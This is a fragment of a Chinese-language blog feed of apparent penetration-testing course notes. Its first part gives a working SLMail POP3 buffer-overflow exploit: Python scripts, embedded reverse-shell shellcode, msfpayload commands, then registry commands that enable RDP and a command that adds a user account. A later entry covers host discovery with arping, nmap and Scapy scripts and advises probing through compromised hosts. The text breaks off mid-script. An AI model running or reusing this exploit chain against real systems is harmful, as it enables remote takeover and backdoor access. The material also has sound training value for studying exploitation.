class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">badchars = (<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">2606</span> + <span class="string">"B"</span>*<span class="number">4</span> + badchars</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>0A 0D 00 三个坏字符</p></li><li><p>重定向数据流</p></li><li><ul><li>用ESP地址替换EIP的值</li><li>但是ESP地质变化，硬编码不可行</li><li>SLMail 线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</li></ul></li><li><p>变通思路</p></li><li><ul><li><p>在内存中寻找地址固定的系统模块</p></li><li><p>在模块中寻找JMP ESP 指令的地址跳转， 再由该指令间接跳转到ESP，从而执行shellcode</p></li><li><p>mona.py脚本识别内存模块，搜索”return address“是JMP ESP指令的模块</p></li><li><p>寻找无DEP、ALSR保护的内存地址</p></li><li><p>内存地址不包含坏字符</p></li><li><p>寻找不受保护的系统模块</p></li><li><ul><li>！mona modules</li></ul></li><li><p>Rebase 操作系统重启后是否发生变化，不发生变化False</p></li><li><p>后三项为系统保护机制</p></li><li><p>前四列False 最后一列为True</p></li><li><p>/usr/share/metasploit-framework/tools/exploit nasm_shell.rb   将汇编指令转化为二进制</p></li><li><p>将 jmp esp 转换  为二进制 FFE4</p></li><li><p><code>！mona find -s &quot;\xff\xe4&quot; -m openc32.dll</code> 找不到</p></li><li><p><code>！mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code></p></li><li><p>选择不包含坏字符的内存地址</p></li><li><p>如果是支持DEP的程序， 就必须找到在Memory map 中 Access权限 R E 都有的</p></li><li><p>重发buffer</p></li><li><p>08.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"A"</span> * <span class="number">2606</span> + <span class="string">"\xe3\x41\x4b\x5f"</span> + <span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>生成shellcode</p></li><li><p>Scratch</p></li><li><p>/usr/share/framework2 ./msfpayload -l</p></li><li><p><code>./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 C</code> </p></li><li><p><code>./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 C | grep 0d</code></p></li><li><p>检查发现有坏字符</p></li><li><p><code>./msfpayload win32_reverse LHOST=10.10.10.128 LPORT=444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></p></li><li><p>去除</p></li><li><p>09.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46\xbd\x2a"</span>+</span><br><span class="line"><span class="string">"\x29\x83\xeb\xfc\xe2\xf4\xba\xd7\xc1\x64\xae\x44\xd5\xd6\xb9\xdd"</span>+</span><br><span class="line"><span class="string">"\xa1\x45\x62\x99\xa1\x6c\x7a\x36\x56\x2c\x3e\xbc\xc5\xa2\x09\xa5"</span>+</span><br><span class="line"><span class="string">"\xa1\x76\x66\xbc\xc1\x60\xcd\x89\xa1\x28\xa8\x8c\xea\xb0\xea\x39"</span>+</span><br><span class="line"><span class="string">"\xea\x5d\x41\x7c\xe0\x24\x47\x7f\xc1\xdd\x7d\xe9\x0e\x01\x33\x58"</span>+</span><br><span class="line"><span class="string">"\xa1\x76\x62\xbc\xc1\x4f\xcd\xb1\x61\xa2\x19\xa1\x2b\xc2\x45\x91"</span>+</span><br><span class="line"><span class="string">"\xa1\xa0\x2a\x99\x36\x48\x85\x8c\xf1\x4d\xcd\xfe\x1a\xa2\x06\xb1"</span>+</span><br><span class="line"><span class="string">"\xa1\x59\x5a\x10\xa1\x69\x4e\xe3\x42\xa7\x08\xb3\xc6\x79\xb9\x6b"</span>+</span><br><span class="line"><span class="string">"\x4c\x7a\x20\xd5\x19\x1b\x2e\xca\x59\x1b\x19\xe9\xd5\xf9\x2e\x76"</span>+</span><br><span class="line"><span class="string">"\xc7\xd5\x7d\xed\xd5\xff\x19\x34\xcf\x4f\xc7\x50\x22\x2b\x13\xd7"</span>+</span><br><span class="line"><span class="string">"\x28\xd6\x96\xd5\xf3\x20\xb3\x10\x7d\xd6\x90\xee\x79\x7a\x15\xfe"</span>+</span><br><span class="line"><span class="string">"\x79\x6a\x15\x42\xfa\x41\x4c\xb7\x20\xa9\x20\xd5\x2b\x95\x20\xee"</span>+</span><br><span class="line"><span class="string">"\xa3\xc8\xd3\xd5\xc6\xd0\xec\xdd\x7d\xd6\x90\xd7\x3a\x78\x13\x42"</span>+</span><br><span class="line"><span class="string">"\xfa\x4f\x2c\xd9\x4c\x41\x25\xd0\x40\x79\x1f\x94\xe6\xa0\xa1\xd7"</span>+</span><br><span class="line"><span class="string">"\x6e\xa0\xa4\x8c\xea\xda\xec\x28\xa3\xd4\xb8\xff\x07\xd7\x04\x91"</span>+</span><br><span class="line"><span class="string">"\xa7\x53\x7e\x16\x81\x82\x2e\xcf\xd4\x9a\x50\x42\x5f\x01\xb9\x6b"</span>+</span><br><span class="line"><span class="string">"\x71\x7e\x14\xec\x7b\x78\x2c\xbc\x7b\x78\x13\xec\xd5\xf9\x2e\x10"</span>+</span><br><span class="line"><span class="string">"\xf3\x2c\x88\xee\xd5\xff\x2c\x42\xd5\x1e\xb9\x6d\x42\xce\x3f\x7b"</span>+</span><br><span class="line"><span class="string">"\x53\xd6\x33\xb9\xd5\xff\xb9\xca\xd6\xd6\x96\xd5\xda\xa3\x42\xe2"</span>+</span><br><span class="line"><span class="string">"\x79\xd6\x90\x42\xfa\x29"</span>)</span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">2606</span> + <span class="string">"\xe3\x41\x4b\x5f"</span> + <span class="string">"\x90"</span>*<span class="number">8</span> + shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.169.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span>+ buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>90 表示汇编语言不操作 保护shellcode</p></li><li><p>nc -vlp 444 侦听444端口</p></li><li><p>shellcode执行结束后以ExitProcess 方式退出整个进程，将导致邮件服务崩溃</p></li><li><p>Slmail是一个基于线程的应用，适用ExitThread方式可以避免整个服务崩溃，可实现重复溢出</p></li><li><p>./msfpayload win32_reverse LHOST=192.168.20.8 EXITFUNC=thread LPORT=443 R<br>| ./msfencode -b “\x00\x0a\x0d”</p></li><li><p>10.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46\xbd\x2a"</span>+</span><br><span class="line"><span class="string">"\x29\x83\xeb\xfc\xe2\xf4\xba\xd7\xc1\x64\xae\x44\xd5\xd6\xb9\xdd"</span>+</span><br><span class="line"><span class="string">"\xa1\x45\x62\x99\xa1\x6c\x7a\x36\x56\x2c\x3e\xbc\xc5\xa2\x09\xa5"</span>+</span><br><span class="line"><span class="string">"\xa1\x76\x66\xbc\xc1\x60\xcd\x89\xa1\x28\xa8\x8c\xea\xb0\xea\x39"</span>+</span><br><span class="line"><span class="string">"\xea\x5d\x41\x7c\xe0\x24\x47\x7f\xc1\xdd\x7d\xe9\x0e\x01\x33\x58"</span>+</span><br><span class="line"><span class="string">"\xa1\x76\x62\xbc\xc1\x4f\xcd\xb1\x61\xa2\x19\xa1\x2b\xc2\x45\x91"</span>+</span><br><span class="line"><span class="string">"\xa1\xa0\x2a\x99\x36\x48\x85\x8c\xf1\x4d\xcd\xfe\x1a\xa2\x06\xb1"</span>+</span><br><span class="line"><span class="string">"\xa1\x59\x5a\x10\xa1\x69\x4e\xe3\x42\xa7\x08\xb3\xc6\x79\xb9\x6b"</span>+</span><br><span class="line"><span class="string">"\x4c\x7a\x20\xd5\x19\x1b\x2e\xca\x59\x1b\x19\xe9\xd5\xf9\x2e\x76"</span>+</span><br><span class="line"><span class="string">"\xc7\xd5\x7d\xed\xd5\xff\x19\x34\xcf\x4f\xc7\x50\x22\x2b\x13\xd7"</span>+</span><br><span class="line"><span class="string">"\x28\xd6\x96\xd5\xf3\x20\xb3\x10\x7d\xd6\x90\xee\x79\x7a\x15\xfe"</span>+</span><br><span class="line"><span class="string">"\x79\x6a\x15\x42\xfa\x41\x4c\xb7\x20\xa9\x20\xd5\x2b\x95\x20\xee"</span>+</span><br><span class="line"><span class="string">"\xa3\xc8\xd3\xd5\xc6\xd0\xec\xdd\x7d\xd6\x90\xd7\x3a\x78\x13\x42"</span>+</span><br><span class="line"><span class="string">"\xfa\x4f\x2c\xd9\x4c\x41\x25\xd0\x40\x79\x1f\x94\xe6\xa0\xa1\xd7"</span>+</span><br><span class="line"><span class="string">"\x6e\xa0\xa4\x8c\xea\xda\xec\x28\xa3\xd4\xb8\xff\x07\xd7\x04\x91"</span>+</span><br><span class="line"><span class="string">"\xa7\x53\x7e\x16\x81\x82\x2e\xcf\xd4\x9a\x50\x42\x5f\x01\xb9\x6b"</span>+</span><br><span class="line"><span class="string">"\x71\x7e\x14\xec\x7b\x78\x2c\xbc\x7b\x78\x13\xec\xd5\xf9\x2e\x10"</span>+</span><br><span class="line"><span class="string">"\xf3\x2c\x88\xee\xd5\xff\x2c\x42\xd5\x1e\xb9\x6d\x42\xce\x3f\x7b"</span>+</span><br><span class="line"><span class="string">"\x53\xd6\x33\xb9\xd5\xff\xb9\xca\xd6\xd6\x96\xd5\xda\xa3\x42\xe2"</span>+</span><br><span class="line"><span class="string">"\x79\xd6\x90\x42\xfa\x29"</span>)</span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">2606</span> + <span class="string">"\x8f\x35\x4a\x5f"</span> + <span class="string">"\x90"</span>*<span class="number">8</span> + shellcode</span><br><span class="line"><span class="comment">#buffer = "A"*2606 + "\xe3\x41\x4b\x5f" + "\x90"*8 + shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.169.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span>+ buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server]&gt;&gt;3389.reg</span><br><span class="line">echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">regedit /s 3389.reg</span><br></pre></td></tr></table></figure></li><li><p>apt-get install rdesktop</p></li><li><p>rdesktop 192.168.10.128</p></li><li><p>net user hello password</p></li><li><p>regsnap 注册表快照</p></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>主动信息收集</title>
      <link href="/2018/03/04/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/03/04/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><h4 id="主动信息收集-1"><a href="#主动信息收集-1" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已被控制的主机</li><li>做好被封杀的准备</li><li>使用噪音迷惑目标，淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测，根据返回结果判断目标状态</li></ul></li></ul><h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul><li>识别活着的主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个IP地址列表</li><li>2、3、4层发现</li></ul><h4 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h4><ul><li><p>优点：扫描速度快、可靠</p></li><li><p>缺点：不可路由</p></li><li><p>Arp协议</p><ul><li>抓包</li></ul></li><li><p>arping</p></li><li><p><code>arping 1.1.1.1 -c 1</code> -c 包数量</p></li><li><p><code>arping -c 1 1.1.1.1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></p></li><li><p>脚本</p></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">if ["$#" -ne 1]; then</span><br><span class="line">echo "usage - ./arping.sh [interface]"</span><br><span class="line">echo "Example - ./arping.sh eth0"</span><br><span class="line">echo "Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">interface=$1</span><br><span class="line">prefix=$(ifconfig $interface | grep 'inet addr' | cut -d ':' -f 2| cut -d ' ' -f 1 | cut -d '.' -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">arping -c 1 $prefix.$addr |grep "bytes from"| cut -d "" -f 5 | cut -d "(" -f 2 | cut -d ")" -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">if [ "$#" -ne 1]; then</span><br><span class="line">echo "Usage - ./arping.sh [interface]"</span><br><span class="line">echo "Example - ./arping.sh eth0"</span><br><span class="line">echo "Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">file = $1</span><br><span class="line">for addr in $(cat $file); do</span><br><span class="line">arping -c 1 $addr | grep "bytes from" | cut -d " " -f 5 | cut -d "(" -f 2| cut -d ")" -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><code>nmap 1.1.1.1-254 -sn</code></p></li><li><p><code>nmap -iL iplist.txt -sn</code></p></li><li><p>不是单纯ARP 还有DNS 可以抓包分析</p></li><li><p>Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换网络环境</li><li>主动和被动探测</li></ul></li><li><p>主动</p><ul><li><code>netdiscover -i eth0 -r 1.1.1.0/24</code></li><li><code>netdiscover -i iplist.txt</code></li></ul></li><li><p>被动</p><ul><li><code>netdiscover -p</code></li><li>主动arp容易触发报警</li></ul></li></ul><ul><li><p>Scapy</p><ul><li>可以作为Python库进行调用</li><li>也可以作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul></li><li><p>apt-get install python-gunplot</p></li><li><p>Scapy</p><ul><li><p><code>ARP().display()</code></p></li><li><p><code>Src1()</code></p></li><li><p>py扫描脚本</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./arp_disc.py [interface]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./arp_disc.py eth0"</span>)</span><br><span class="line">    print(<span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ip = subprocess.check_output(<span class="string">"ifconfig"</span> + interface + <span class="string">"| grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1"</span>,shell=<span class="keyword">True</span> ).strip()</span><br><span class="line">prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>]+<span class="string">'.'</span>+ip.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+ip.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">    answer = sr1(ARP(pdst=prefix+str(addr)),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(prefix+str(addr))</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./arp_disc.py [interface]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./arp_disc.py eth0"</span>)</span><br><span class="line">    print(<span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">filename = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">file = open(filename,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> file:</span><br><span class="line">    answer = srl(ARP(pdst=addr.strip()), timeout=<span class="number">0.1</span>,verbose=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> addr.strip()</span><br></pre></td></tr></table></figure></li><li><p>​</p></li></ul><h4 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h4><ul><li><p>优点</p><ul><li>可路由</li><li>速度比较快</li></ul></li><li><p>缺点</p><ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li><p>IP、ICMP协议</p></li><li><p><code>ping 1.1.1.1 -c 2</code></p></li><li><p><code>ping -R 1.1.1.1   / traceroute 1.1.1.1</code></p></li><li><p>`ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d “ “ -f 4 | cut -d “:” -f 1</p></li><li><p>脚本</p></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span 